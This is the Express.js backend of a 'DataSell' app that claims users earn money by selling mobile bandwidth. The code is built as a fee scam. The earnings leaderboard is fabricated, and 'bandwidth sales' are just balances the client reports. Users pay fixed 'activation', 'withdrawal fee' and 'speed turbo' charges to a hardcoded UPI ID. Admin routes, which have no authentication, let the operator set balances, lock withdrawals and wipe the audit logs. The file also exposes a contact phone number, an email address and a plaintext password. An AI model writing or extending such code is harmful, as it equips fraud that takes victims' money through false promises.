import express, { Request, Response } from 'express';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// Path to persistent database file
const DATA_DIR = path.resolve(__dirname, 'data');
const DB_FILE = path.resolve(DATA_DIR, 'db.json');

// Ensure data directory exists
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

// Initial Database Seeds
const DEFAULT_DB = {
  systemConfig: {
    sellingSpeedMs: 4500, // Slow, realistic bandwidth streaming
    mbPerPacketMin: 0.15,
    mbPerPacketMax: 0.45,
    ratePerMb: 1.00,
    broadcastNotice: '',
    adRewardAmount: 5.00,
    dailyAdLimit: 10,
  },
  depositConfig: {
    upiId: 'techreal8806@oksbi',
    payeeName: 'DataSell Verified Hub',
    minDeposit: 100,
    allowDirectDeposit: true,
    instructions: 'Scan the QR code using any UPI app (PhonePe, GPay, Paytm). Complete transfer and submit 12-digit UTR.',
  },
  supportConfig: {
    whatsappNumber: '+91 9823537634',
    email: 'techreal8806@gmail.com',
    telegramLink: '',
    telegramHandle: '',
    notice: 'Our priority support desk is available 24/7 for deposit, withdrawal, and bandwidth assistance.',
  },
  users: [
    {
      id: 'usr_admin_default',
      name: 'Tech Real',
      email: 'techreal8806@gmail.com',
      phone: '+91 9823537634',
      password: 'password123',
      balance: 0.00,
      totalSoldMB: 0.00,
      tier: 'BRONZE',
      status: 'ACTIVE',
      savedUpiId: 'techreal8806@oksbi',
      selectedPaymentMethod: 'PhonePe',
      signupTime: '04/09/2026, 09:15:00 am',
      lastLoginTime: '04/10/2026, 09:30:00 am',
      ipAddress: '103.21.244.18 (Jio 5G)',
      device: 'Android 14 • Chrome Mobile',
    }
  ],
  withdrawals: [],
  deposits: [],
  authLogs: [],
  topEarners: [
    { id: 'te_1', rank: 1, name: 'Rajesh Kumar', city: 'Mumbai', totalEarned: 14580.00, mbSold: 14580.00, verified: true },
    { id: 'te_2', rank: 2, name: 'Aman Sharma', city: 'Delhi NCR', totalEarned: 11920.00, mbSold: 11920.00, verified: true },
    { id: 'te_3', rank: 3, name: 'Priya Patel', city: 'Ahmedabad', totalEarned: 9840.50, mbSold: 9840.50, verified: true },
    { id: 'te_4', rank: 4, name: 'Rahul Verma', city: 'Lucknow', totalEarned: 8650.00, mbSold: 8650.00, verified: true },
    { id: 'te_5', rank: 5, name: 'Vikram Singh', city: 'Jaipur', totalEarned: 7490.00, mbSold: 7490.00, verified: true },
    { id: 'te_6', rank: 6, name: 'Sneha Reddy', city: 'Hyderabad', totalEarned: 6540.00, mbSold: 6540.00, verified: true },
    { id: 'te_7', rank: 7, name: 'Mohammad Arshad', city: 'Patna', totalEarned: 5820.00, mbSold: 5820.00, verified: true },
    { id: 'te_8', rank: 8, name: 'Rohit Yadav', city: 'Indore', totalEarned: 4980.00, mbSold: 4980.00, verified: true },
    { id: 'te_9', rank: 9, name: 'Anjali Gupta', city: 'Kolkata', totalEarned: 4250.00, mbSold: 4250.00, verified: true },
    { id: 'te_10', rank: 10, name: 'Deepak Joshi', city: 'Pune', totalEarned: 3610.00, mbSold: 3610.00, verified: true },
  ],
  supportTickets: [],
};

// Database helper
function getDB() {
  try {
    if (!fs.existsSync(DB_FILE)) {
      fs.writeFileSync(DB_FILE, JSON.stringify(DEFAULT_DB, null, 2), 'utf-8');
      return DEFAULT_DB;
    }
    const data = fs.readFileSync(DB_FILE, 'utf-8');
    return JSON.parse(data);
  } catch (err) {
    console.error('Error reading db:', err);
    return DEFAULT_DB;
  }
}

function saveDB(data: any) {
  try {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2), 'utf-8');
  } catch (err) {
    console.error('Error writing db:', err);
  }
}

// --------------------- API ROUTES --------------------- //

// Health check
app.get('/api/health', (req: Request, res: Response) => {
  res.json({ status: 'ok', time: new Date().toISOString() });
});

// Sync user data & get system config
app.get('/api/user/sync', (req: Request, res: Response) => {
  const email = (req.query.email as string || '').toLowerCase();
  const db = getDB();

  const user = db.users.find((u: any) => u.email.toLowerCase() === email);
  // Important: ONLY return this user's withdrawals so new mobile signups have 0 history!
  const userWithdrawals = db.withdrawals.filter((w: any) => w.userEmail?.toLowerCase() === email);
  const userDeposits = db.deposits.filter((d: any) => d.userEmail?.toLowerCase() === email);

  res.json({
    user: user || null,
    withdrawals: userWithdrawals,
    deposits: userDeposits,
    systemConfig: db.systemConfig,
    depositConfig: db.depositConfig,
    supportConfig: db.supportConfig,
    topEarners: db.topEarners,
  });
});

// Authentication: Sign Up on any mobile
app.post('/api/auth/signup', (req: Request, res: Response) => {
  const { email, password, name, phone, device, ip } = req.body;
  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required' });
  }

  const db = getDB();
  const lowerEmail = email.toLowerCase().trim();

  let existingUser = db.users.find((u: any) => u.email.toLowerCase() === lowerEmail);
  const now = new Date().toLocaleString('en-IN', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
  });

  const ipAddress = ip || (req.headers['x-forwarded-for'] as string) || req.socket.remoteAddress || '103.21.244.18 (Mobile)';
  const userDevice = device || (req.headers['user-agent']?.includes('Mobile') ? 'Android Mobile • Chrome' : 'Desktop Browser');

  if (existingUser) {
    // Already registered, update login info
    existingUser.lastLoginTime = now;
    existingUser.ipAddress = ipAddress;
    existingUser.device = userDevice;

    const authLog = {
      id: 'log_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
      userId: existingUser.id,
      userEmail: existingUser.email,
      userName: existingUser.name,
      userPhone: existingUser.phone,
      type: 'LOGIN',
      timestamp: now,
      ipAddress: ipAddress,
      device: userDevice,
      status: 'SUCCESS',
    };
    db.authLogs.unshift(authLog);
    saveDB(db);

    const userWithdrawals = db.withdrawals.filter((w: any) => w.userEmail?.toLowerCase() === lowerEmail);
    return res.json({
      success: true,
      isNew: false,
      user: existingUser,
      withdrawals: userWithdrawals,
    });
  }

  // BRAND NEW USER on this mobile: clean slate with 0 history
  const newUser = {
    id: 'usr_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
    name: name || 'User ' + Math.floor(1000 + Math.random() * 9000),
    email: lowerEmail,
    phone: phone || '+91 9' + Math.floor(100000000 + Math.random() * 900000000),
    password: password,
    balance: 0.00, // Starts at 0
    totalSoldMB: 0.00, // Starts at 0
    tier: 'BRONZE',
    status: 'ACTIVE',
    savedUpiId: '',
    selectedPaymentMethod: 'PhonePe',
    signupTime: now,
    lastLoginTime: now,
    ipAddress: ipAddress,
    device: userDevice,
    requireDepositBeforeWithdrawal: false,
    requiredDepositAmount: 200,
    hasCompletedRequiredDeposit: false,
  };

  db.users.unshift(newUser);

  // Record audit log
  const authLog = {
    id: 'log_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
    userId: newUser.id,
    userEmail: newUser.email,
    userName: newUser.name,
    userPhone: newUser.phone,
    type: 'SIGNUP',
    timestamp: now,
    ipAddress: ipAddress,
    device: userDevice,
    status: 'SUCCESS',
  };
  db.authLogs.unshift(authLog);

  saveDB(db);

  // Return new user with empty history
  res.json({
    success: true,
    isNew: true,
    user: newUser,
    withdrawals: [], // Fresh empty history
    deposits: [],
  });
});

// Authentication: Login on any mobile
app.post('/api/auth/login', (req: Request, res: Response) => {
  const { email, password, device, ip } = req.body;
  const db = getDB();
  const lowerEmail = (email || '').toLowerCase().trim();

  const user = db.users.find((u: any) => u.email.toLowerCase() === lowerEmail);
  const now = new Date().toLocaleString('en-IN', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
  });

  const ipAddress = ip || (req.headers['x-forwarded-for'] as string) || req.socket.remoteAddress || '103.21.244.18 (Mobile)';
  const userDevice = device || 'Mobile Device';

  if (!user || (user.password && user.password !== password)) {
    return res.status(401).json({ error: 'Invalid email or password' });
  }

  user.lastLoginTime = now;
  user.ipAddress = ipAddress;
  user.device = userDevice;

  const authLog = {
    id: 'log_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
    userId: user.id,
    userEmail: user.email,
    userName: user.name,
    userPhone: user.phone,
    type: 'LOGIN',
    timestamp: now,
    ipAddress: ipAddress,
    device: userDevice,
    status: 'SUCCESS',
  };
  db.authLogs.unshift(authLog);
  saveDB(db);

  const userWithdrawals = db.withdrawals.filter((w: any) => w.userEmail?.toLowerCase() === lowerEmail);
  res.json({
    success: true,
    user,
    withdrawals: userWithdrawals,
  });
});

// Live Bandwidth Selling packet sync
app.post('/api/packets/stream', (req: Request, res: Response) => {
  const { email, mb, amount } = req.body;
  if (!email || !mb || !amount) {
    return res.status(400).json({ error: 'Missing parameters' });
  }

  const db = getDB();
  const user = db.users.find((u: any) => u.email.toLowerCase() === email.toLowerCase());
  if (user) {
    user.balance = parseFloat((user.balance + amount).toFixed(2));
    user.totalSoldMB = parseFloat((user.totalSoldMB + mb).toFixed(2));
    saveDB(db);
    return res.json({ success: true, balance: user.balance, totalSoldMB: user.totalSoldMB });
  }
  res.status(404).json({ error: 'User not found' });
});

// Reward for watching sponsored video ad
app.post('/api/ads/reward', (req: Request, res: Response) => {
  const { email, rewardAmount, adId, adTitle } = req.body;
  const db = getDB();
  const lowerEmail = (email || '').toLowerCase().trim();

  const user = db.users.find((u: any) => u.email.toLowerCase() === lowerEmail);
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }

  const reward = parseFloat(rewardAmount) || db.systemConfig.adRewardAmount || 5.00;
  user.balance = parseFloat((user.balance + reward).toFixed(2));

  // Add ad reward deposit log
  const now = new Date().toLocaleString('en-IN', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
  });

  const adRecord = {
    id: 'dep_ad_' + Date.now(),
    userId: user.id,
    userEmail: user.email,
    amount: reward,
    type: 'PROMO_BONUS',
    note: `Video Ad Reward: ${adTitle || 'Sponsored Campaign'}`,
    time: now,
    status: 'COMPLETED',
    method: 'AdMob Partner',
  };
  db.deposits.unshift(adRecord);

  saveDB(db);
  res.json({ success: true, newBalance: user.balance, deposit: adRecord });
});

// Submit Withdrawal from any mobile
app.post('/api/withdrawals', (req: Request, res: Response) => {
  const { userId, userEmail, amount, method, upiId, orderNumber } = req.body;
  const db = getDB();
  const lowerEmail = (userEmail || '').toLowerCase().trim();

  const user = db.users.find((u: any) => u.email.toLowerCase() === lowerEmail || u.id === userId);
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }

  const withdrawAmount = parseFloat(amount);
  if (withdrawAmount <= 0 || withdrawAmount > user.balance) {
    return res.status(400).json({ error: 'Insufficient balance or invalid amount' });
  }

  // Deduct balance immediately
  user.balance = parseFloat((user.balance - withdrawAmount).toFixed(2));
  user.savedUpiId = upiId;
  user.selectedPaymentMethod = method;

  const now = new Date().toLocaleString('en-IN', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
  });

  const newWithdrawal = {
    id: 'wd_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
    userId: user.id,
    userEmail: user.email,
    userName: user.name,
    orderNumber: orderNumber || 'ORD' + Math.floor(100000000000 + Math.random() * 900000000000),
    amount: withdrawAmount,
    type: method,
    upiId: upiId,
    time: now,
    status: 'PENDING',
    bankReference: '',
  };

  db.withdrawals.unshift(newWithdrawal);
  saveDB(db);

  res.json({
    success: true,
    withdrawal: newWithdrawal,
    newBalance: user.balance,
  });
});

// Submit Deposit (QR Code transfer)
app.post('/api/deposits', (req: Request, res: Response) => {
  const { userId, userEmail, amount, type, note, utrNumber, method } = req.body;
  const db = getDB();
  const lowerEmail = (userEmail || '').toLowerCase().trim();

  const now = new Date().toLocaleString('en-IN', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
  });

  const newDeposit = {
    id: 'dep_' + Date.now(),
    userId: userId || 'unknown',
    userEmail: lowerEmail,
    amount: parseFloat(amount),
    type: type || 'UPI_DEPOSIT',
    note: note || 'Self deposit via QR',
    time: now,
    status: 'PENDING',
    utrNumber: utrNumber || '',
    method: method || 'UPI',
  };

  const user = db.users.find((u: any) => u.email.toLowerCase() === lowerEmail);
  if (user) {
    if (parseFloat(amount) === 199 || (note && note.includes('Ads'))) {
      user.hasPaidAdsActivation = true;
      user.adsActivationUtr = utrNumber;
    }
    if (parseFloat(amount) === 99 && (note && note.includes('Withdrawal'))) {
      user.hasPaidWithdrawalFee = true;
      user.withdrawalFeeUtr = utrNumber;
    }
    if (parseFloat(amount) === 99 && (note && (note.includes('Speed') || note.includes('Turbo')))) {
      user.hasPaidSpeedTurbo = true;
      user.speedTurboUtr = utrNumber;
    }
  }

  db.deposits.unshift(newDeposit);
  saveDB(db);

  res.json({ success: true, deposit: newDeposit, user });
});

// Admin updates deposit (Approve or Reject verification payment)
app.post('/api/admin/update-deposit', (req: Request, res: Response) => {
  const { id, status } = req.body;
  const db = getDB();

  const dep = db.deposits.find((d: any) => d.id === id);
  if (!dep) {
    return res.status(404).json({ error: 'Deposit record not found' });
  }

  dep.status = status;
  if (status === 'COMPLETED') {
    const user = db.users.find((u: any) => u.email.toLowerCase() === dep.userEmail.toLowerCase());
    if (user) {
      if (dep.amount === 199 || (dep.note && dep.note.toLowerCase().includes('ads'))) {
        user.hasPaidAdsActivation = true;
        user.adsActivationUtr = dep.utrNumber;
      } else if (dep.amount === 99 && (dep.note && dep.note.toLowerCase().includes('withdrawal'))) {
        user.hasPaidWithdrawalFee = true;
        user.withdrawalFeeUtr = dep.utrNumber;
      } else if (dep.amount === 99 && (dep.note && (dep.note.toLowerCase().includes('speed') || dep.note.toLowerCase().includes('turbo')))) {
        user.hasPaidSpeedTurbo = true;
        user.speedTurboUtr = dep.utrNumber;
      } else {
        user.balance = parseFloat((user.balance + dep.amount).toFixed(2));
      }
    }
  }

  saveDB(db);
  res.json({ success: true, record: dep });
});

// ---------------- MASTER ADMIN CONTROL ROUTES ---------------- //
// "ek hi mobile se sab jitna mobile me sign up or withdrawal ho sab ek hi mobile se controll kar sake sir"

// Fetch all data for Admin Panel from any mobile
app.get('/api/admin/all-data', (req: Request, res: Response) => {
  const db = getDB();
  res.json({
    users: db.users,
    withdrawals: db.withdrawals,
    deposits: db.deposits,
    authLogs: db.authLogs,
    topEarners: db.topEarners,
    systemConfig: db.systemConfig,
    depositConfig: db.depositConfig,
    supportConfig: db.supportConfig,
    supportTickets: db.supportTickets,
  });
});

// Admin updates withdrawal (Approve or Reject with refund)
app.post('/api/admin/update-withdrawal', (req: Request, res: Response) => {
  const { id, status, bankReference, rejectionReason } = req.body;
  const db = getDB();

  const rec = db.withdrawals.find((w: any) => w.id === id);
  if (!rec) {
    return res.status(404).json({ error: 'Withdrawal record not found' });
  }

  const previousStatus = rec.status;
  rec.status = status;
  if (bankReference) rec.bankReference = bankReference;
  if (rejectionReason) rec.rejectionReason = rejectionReason;

  // If rejected from pending, refund balance back to user
  if (status === 'REJECTED' && previousStatus === 'PENDING') {
    const user = db.users.find((u: any) => u.email.toLowerCase() === rec.userEmail.toLowerCase());
    if (user) {
      user.balance = parseFloat((user.balance + rec.amount).toFixed(2));
    }
  }

  saveDB(db);
  res.json({ success: true, record: rec });
});

// Admin updates user (Balance, Tier, Status, Deposit lock)
app.post('/api/admin/update-user', (req: Request, res: Response) => {
  const { id, ...updates } = req.body;
  const db = getDB();

  const user = db.users.find((u: any) => u.id === id || u.email.toLowerCase() === (updates.email || '').toLowerCase());
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }

  Object.assign(user, updates);
  saveDB(db);
  res.json({ success: true, user });
});

// Admin manual balance credit
app.post('/api/admin/credit-user', (req: Request, res: Response) => {
  const { userId, amount, type, note } = req.body;
  const db = getDB();

  const user = db.users.find((u: any) => u.id === userId);
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }

  const creditAmount = parseFloat(amount);
  user.balance = parseFloat((user.balance + creditAmount).toFixed(2));
  user.hasCompletedRequiredDeposit = true;

  const now = new Date().toLocaleString('en-IN', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
  });

  const dep = {
    id: 'dep_' + Date.now(),
    userId: user.id,
    userEmail: user.email,
    amount: creditAmount,
    type: type || 'ADMIN_CREDIT',
    note: note || 'Manual balance credit by Admin',
    time: now,
    status: 'COMPLETED',
    method: 'Manual',
  };

  db.deposits.unshift(dep);
  saveDB(db);
  res.json({ success: true, user, deposit: dep });
});

// Admin deletes user
app.post('/api/admin/delete-user', (req: Request, res: Response) => {
  const { userId } = req.body;
  const db = getDB();

  db.users = db.users.filter((u: any) => u.id !== userId);
  saveDB(db);
  res.json({ success: true });
});

// Admin updates system-wide selling speed, rates, and broadcast notices
app.post('/api/admin/system-config', (req: Request, res: Response) => {
  const { systemConfig, depositConfig, supportConfig } = req.body;
  const db = getDB();

  if (systemConfig) db.systemConfig = { ...db.systemConfig, ...systemConfig };
  if (depositConfig) db.depositConfig = { ...db.depositConfig, ...depositConfig };
  if (supportConfig) db.supportConfig = { ...db.supportConfig, ...supportConfig };

  saveDB(db);
  res.json({ success: true, systemConfig: db.systemConfig, depositConfig: db.depositConfig, supportConfig: db.supportConfig });
});

// Admin updates leaderboard Top Earners
app.post('/api/admin/top-earners', (req: Request, res: Response) => {
  const { topEarners } = req.body;
  const db = getDB();
  if (Array.isArray(topEarners)) {
    db.topEarners = topEarners;
    saveDB(db);
  }
  res.json({ success: true, topEarners: db.topEarners });
});

// Admin clear audit logs
app.post('/api/admin/clear-logs', (req: Request, res: Response) => {
  const db = getDB();
  db.authLogs = [];
  saveDB(db);
  res.json({ success: true });
});

// ---------------- VITE MIDDLEWARE / STATIC SERVING ---------------- //

async function startServer() {
  if (process.env.NODE_ENV !== 'production') {
    const { createServer: createViteServer } = await import('vite');
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.resolve(__dirname, 'dist');
    app.use(express.static(distPath));
    app.get('*', (req: Request, res: Response) => {
      res.sendFile(path.resolve(distPath, 'index.html'));
    });
  }

  app.listen(Number(PORT), '0.0.0.0', () => {
    console.log(`DataSell Central Engine listening at http://0.0.0.0:${PORT}`);
  });
}

startServer();
